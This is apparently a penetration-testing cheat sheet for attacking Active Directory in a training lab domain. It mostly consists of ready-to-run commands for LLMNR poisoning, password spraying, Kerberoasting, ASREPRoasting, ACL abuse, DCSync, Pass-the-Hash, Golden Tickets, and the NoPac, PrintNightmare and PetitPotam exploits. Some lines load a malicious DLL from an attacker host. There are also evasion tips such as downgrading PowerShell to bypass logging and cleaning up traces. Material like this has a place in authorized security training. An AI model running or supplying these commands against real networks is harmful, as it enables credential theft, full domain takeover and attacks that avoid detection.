---
title: "AD Enumeration & Attacks"
description: "BloodHound, Kerberos, ACL abuse, and trust attacks in Active Directory."
sidebar:
  order: 1
  label: "AD Enumeration & Attacks"
---
> Enumeration and attacks against AD environments: from foothold to Domain Admin. Covers LLMNR poisoning, password spraying, Kerberoasting, ASREPRoasting, ACL abuse, DCSync, Pass-the-Hash, and recent CVEs.

---

## Initial Enumeration (No Creds)

```bash
# Discover live hosts on the internal network
fping -asgq 172.16.5.0/23

# Nmap — discover DC and services
sudo nmap -v -A 172.16.5.5 --open

# Responder in analyze mode (passive — does not poison)
sudo responder -I ens224 -A

# Enumerate valid users with Kerbrute (no creds)
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

---

## LLMNR / NBT-NS Poisoning

### From Linux — Responder

```bash
# Poison and capture NetNTLMv2
sudo responder -I ens224 -w -r -f -P

# Crack the captured hash
hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt
# Format: username::DOMAIN:challenge:hash1:hash2
```

### From Windows — Inveigh

```powershell
# PowerShell (Inveigh.ps1)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -LLMNR Y -ConsoleOutput Y -FileOutput Y

# C# (InveighZero — executable)
.\Inveigh.exe

# View captured results
Get-Inveigh.NTLMv2Unique
Get-Inveigh.Cleartext
```

---

## Password Policy Enumeration

```bash
# No creds (Linux)
crackmapexec smb 172.16.5.5 --pass-pol
enum4linux -P 172.16.5.5
enum4linux-ng -P 172.16.5.5 -oA output

# With creds
rpcclient -U "" -N 172.16.5.5 -c "getdompwinfo"
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# With creds — Windows (net.exe LOL)
net accounts /domain
```

> **Rule:** Check the lockout threshold BEFORE performing a password spray. Never exceed n-1 attempts.

---

## Password Spraying

```bash
# From Linux — Kerbrute
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# From Linux — CrackMapExec
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# Validate found credentials
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

# From Windows — DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

---

## Enumeration with Credentials (Linux)

```bash
# List shares with smbmap
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R "Department Shares"

# Download file from share
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 --download "path/to/file"

# rpcclient — enumerate users and groups
rpcclient -U "INLANEFREIGHT\forend%Klmcargo2" 172.16.5.5
rpcclient $> enumdomusers
rpcclient $> queryuser 0x457        # user info by RID

# Remote execution
impacket-psexec inlanefreight.local/forend:Klmcargo2@172.16.5.5
impacket-wmiexec inlanefreight.local/forend:Klmcargo2@172.16.5.5

# windapsearch
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

# CrackMapExec — enumerate users, groups
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# BloodHound.py — collect everything from Linux
bloodhound-python -u forend -p Klmcargo2 -ns 172.16.5.5 -d inlanefreight.local -c all
# → generates JSON files → zip → upload to BloodHound GUI
```

---

## Enumeration with Credentials (Windows)

### ActiveDirectory PS Module

```powershell
# Basic domain info
Get-ADDomain

# Users with SPN (Kerberoastable)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Domain trusts
Get-ADTrust -Filter *

# Groups
Get-ADGroup -Filter * | select name
Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView

```powershell
Import-Module .\PowerView.ps1

# Map trusts
Get-DomainTrustMapping

# Find users with SPN
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# Find users without Kerberos pre-auth (ASREPRoastable)
Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol

# Domain Admins members (recursive)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Verify local admin access on host
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

### SharpHound (Windows)

```powershell
# Collect everything (generates a ZIP to import into BloodHound)
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

### LOL Binaries (No External Tools)

```powershell
# Hosts, routes, active sessions
hostname; [System.Environment]::OSVersion.Version
ipconfig /all; route print; arp -a
qwinsta                          # currently logged-in users
netsh advfirewall show allprofiles
sc query windefend               # Defender status

# net.exe
net accounts /domain             # password policy
net group "Domain Admins" /domain
net user /domain <usuario>
net1 group /domain               # alternative if net is monitored

# dsquery (admin context)
dsquery user
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -attr sAMAccountName  # DCs

# Snaffler — credential hunting in shares
.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

# PowerShell history
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# Downgrade to PSv2 to bypass logging (EventID 4104)
powershell.exe -version 2
```

---

## Kerberoasting

### From Linux

```bash
# List accounts with SPN
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Request ALL TGS tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# Request ticket for specific user and save
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

# Crack
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
# RC4 → type 23 ($krb5tgs$23$) → hashcat -m 13100
# AES → type 18 ($krb5tgs$18$) → hashcat -m 19700 (much slower)
```

### From Windows — Rubeus

```powershell
# Kerberoastable account statistics
.\Rubeus.exe kerberoast /stats

# Roast accounts with admincount=1 (high value)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Roast specific account
.\Rubeus.exe kerberoast /user:sqldev /nowrap

# Force RC4 on accounts with AES (downgrade)
.\Rubeus.exe kerberoast /rc4opsec /nowrap
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```

### From Windows — PowerView + Mimikatz

```powershell
# PowerView → export tickets in Hashcat format
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

# Mimikatz → extract tickets from memory
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
# Then in Linux:
# echo "<base64>" | tr -d \\n | base64 -d > ticket.kirbi
# python2.7 kirbi2john.py ticket.kirbi → hashcat -m 13100
```

---

## ASREPRoasting

```bash
# From Linux (does not require creds if usernames are known)
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt

# With creds — automatic list
GetNPUsers.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -format hashcat -outputfile asrep_hashes.txt

# Crack
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

```powershell
# From Windows — Rubeus
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Enumerate first with PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol
```

---

## ACL Abuse

```powershell
# Enumerate ACEs on a specific object
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# ForceChangePassword — change password without knowing it
$cred = ConvertTo-SecureString 'Klmcargo2' -AsPlainText -Force
$pass = ConvertTo-SecureString 'NewPassword1!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $pass -Credential $cred

# GenericAll / GenericWrite on group — add user
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members damundsen -Credential $cred
Get-DomainGroupMember -Identity 'Help Desk Level 1' | Select MemberName

# WriteDACL — give user DCSync rights
$SecPassword = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\adunn', $SecPassword)
Add-DomainObjectACL -TargetIdentity INLANEFREIGHT.LOCAL -PrincipalIdentity adunn -Rights DCSync

# GenericWrite on user — assign SPN for targeted Kerberoasting
Set-DomainObject -Credential $Cred -Identity <target_user> -Set @{serviceprincipalname="fake/NOTHING"}
# → Kerberoast that user → crack → Remove-DomainObject SPN
```

---

## DCSync

```bash
# From Linux — secretsdump
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
secretsdump.py -just-dc-user INLANEFREIGHT/administrator INLANEFREIGHT/adunn@172.16.5.5

# Useful flags:
# -just-dc → only NTLM hashes and Kerberos keys from NTDS
# -just-dc-ntlm → only NTLM hashes
# -just-dc-user <usr> → specific user hash
# -pwd-last-set → show last password change date
# -history → include password history
# -show-machine-accs → include machine accounts
```

```powershell
# From Windows — Mimikatz
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\krbtgt   # krbtgt hash for Golden Ticket

# Requirement: account with DS-Replication-Get-Changes + DS-Replication-Get-Changes-All privileges
# → Typically: Domain Admins, Enterprise Admins, or abused WriteDACL ACL
```

---

## Pass-the-Hash / Pass-the-Ticket

```bash
# Pass-the-Hash — Linux (with NTLM hash)
crackmapexec smb 172.16.5.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c
impacket-psexec administrator@172.16.5.5 -hashes :13b29964cc2480b4ef454c59562e675c
evil-winrm -i 172.16.5.5 -u administrator -H 13b29964cc2480b4ef454c59562e675c
```

```powershell
# Pass-the-Hash — Windows — Mimikatz
mimikatz # sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.local /run:cmd.exe

# Dumping credentials from memory
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords       # cleartext + hashes in memory
mimikatz # sekurlsa::wdigest              # cleartext if WDigest is active
```

---

## Recent Vulnerabilities (Bleeding Edge)

### NoPac — CVE-2021-42278 + CVE-2021-42287

```bash
# Verify if the DC is vulnerable
sudo python3 scanner.py inlanefreight.local\forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Shell as SYSTEM on the DC
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 \
  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# DCSync via NoPac (without shell)
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 \
  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

### PrintNightmare — CVE-2021-1675 / CVE-2021-34527

```bash
# Verify active spooler
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# Exploit — add local user with PrivEsc
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\<ATTACK_IP>\share\MyMalDLL.dll'

# PowerShell PoC from Windows
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

### PetitPotam + ADCS — CVE-2021-36942

```bash
# 1. Start ntlmrelayx pointing to ADCS
sudo ntlmrelayx.py -debug -smb2support --target http://<ADCS_HOST>/certsrv/certfnsh.asp \
  --adcs --template DomainController

# 2. Coercion via PetitPotam
python3 PetitPotam.py <ATTACK_IP> <DC_IP>

# 3. Request TGT with the obtained certificate
python3 gettgtpkinit.py -pfx-base64 <cert_b64> INLANEFREIGHT.LOCAL/DC01$ dc01_tgt.ccache

# 4. Extract DC's NT hash
export KRB5CCNAME=dc01_tgt.ccache
python3 getnthash.py -key <key> INLANEFREIGHT.LOCAL/DC01$

# 5. DCSync with DC machine account hash
secretsdump.py -just-dc-user administrator -hashes :<DC_NT_HASH> INLANEFREIGHT.LOCAL/DC01$@172.16.5.5
```

---

## Trust Attacks — Child → Parent Domain

```bash
# Option 1: automated
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

# Option 2: manual with Mimikatz (ExtraSids — Golden Ticket with SID History)
# a) Obtain KRBTGT hash of the child domain
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

# b) Obtain child domain SID and parent Enterprise Admins group SID
Get-ADDomain -Identity LOGISTICS.INLANEFREIGHT.LOCAL   # → child SID
Get-ADGroup -Identity "Enterprise Admins" -Server INLANEFREIGHT.LOCAL  # → EA SID

# c) Generate inter-domain Golden Ticket
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL \
  /sid:<CHILD_DOMAIN_SID> /krbtgt:<CHILD_KRBTGT_HASH> \
  /sids:<ENTERPRISE_ADMINS_SID> /ptt

# d) DCSync on the root domain
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

---

## GPP Credentials (SYSVOL)

```bash
# Search for cpassword in SYSVOL
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password

# Decrypt manually
gpp-decrypt "<cpassword_value>"

# Search in mounted shares
findstr /S /I cpassword \\<DC>\sysvol\<domain>\policies\*.xml
```

---

## AD Attack Flow — End-to-End

```
[No Creds]
  → fping + nmap → Responder LLMNR → hashcat 5600 → user credentials
  → kerbrute userenum → valid list → password spray

[With User]
  → BloodHound.py + SharpHound → attack path analysis
  → Kerberoast → hashcat 13100 → service account passwords
  → ASREPRoast → hashcat 18200 → DONT_REQ_PREAUTH account passwords
  → ACL abuse → ForceChangePassword / GenericAll → escalation

[With Privileges]
  → DCSync (secretsdump / mimikatz lsadump::dcsync) → admin/krbtgt NTLM hash
  → Pass-the-Hash → DA access / lateral movement
  → Golden Ticket (krbtgt hash) → persistence
  → Trust attack (raiseChild / ExtraSids) → parent domain

[Clean Up Traces]
  → Delete assigned SPN if targeted Kerberoast was performed
  → Revert ACL changes (Remove-DomainObjectACL)
  → Delete users/groups created during the attack
```

---

## Pitfalls / Gotchas

- **Password spray without checking lockout** → accounts will lock out and alert the SOC. Always verify the threshold with CrackMapExec `--pass-pol` beforehand.
- **Kerberoasting in AES (type 18)** → takes 4-5x longer than RC4 (type 23). Use `/tgtdeleg` in Rubeus to force RC4 (does not work on Server 2019 DC).
- **DCSync requires specific privileges** → `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`. Without both, it fails silently.
- **NoPac is easily detected** → generates events 4741+4742 (computer object creation/modification). Use in environments without active EDR.
- **PrintNightmare** → requires active Print Spooler on the DC. Verify with `rpcdump.py | grep MS-RPRN`.
- **BloodHound database not updating** → if neo4j is running but the GUI is empty, import the SharpHound ZIP manually.
- **PetitPotam blocked** → many modern environments are already patched. Verify with `rpcdump.py | grep MS-EFSR`.
- **PowerView `Find-InterestingDomainAcl`** → extremely slow in large domains. Use `Get-DomainObjectACL` with a specific SID instead.
- **SharpHound on Win 2022 DC** → may require `/ldaps` if LDAP without TLS is disabled.
- **GPP Passwords** → the MS14-025 patch only prevents creating new GPPs with `cpassword`, it does not delete existing ones. Always search SYSVOL.
- **SID History / ExtraSids** → requires SID Filtering to not be enabled on the trust. In trusts moderns with active SID filtering, the attack does not work.
- **Automatic raiseChild.py** → can fail if the child domain does not have a standard trust configuration. Perform the process manually in that case.

---

## Related Cheatsheets

- [Password Attacks](/en/metodologias/exploitation/password-attacks/) — hashcat modes, cracking workflows, NTDS dump
- [Using the Metasploit Framework](/en/metodologias/exploitation/metasploit-framework/) — AD modules, psexec, hashdump
- [Pivoting, Tunneling, and Port Forwarding](/en/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — pivoting to DC from foothold
- [Attacking Enterprise Networks](/en/metodologias/active-directory/attacking-enterprise-networks/) — end-to-end flow with AD as the final target
- [Windows Privilege Escalation](/en/metodologias/privesc/windows-privilege-escalation/) — local PrivEsc before lateral movement in AD
